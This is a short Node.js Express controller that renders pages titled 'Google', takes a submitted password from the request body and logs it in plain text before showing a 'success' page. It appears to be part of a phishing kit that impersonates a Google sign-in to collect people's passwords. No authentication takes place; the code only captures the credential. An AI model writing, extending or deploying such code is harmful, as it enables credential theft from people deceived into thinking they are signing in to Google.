const passCtrl = {};

passCtrl.getPass = async (req, res) => {
    res.render('password', {
        doc_title: 'Google'
    })
}

passCtrl.passField = async (req, res) => {
    const {password} = req.body;
    console.log(password.trim());
}

passCtrl.getSuccess = async (req, res) => {
    res.render('success', {
        doc_title: 'Google'
    })
}
module.exports = passCtrl;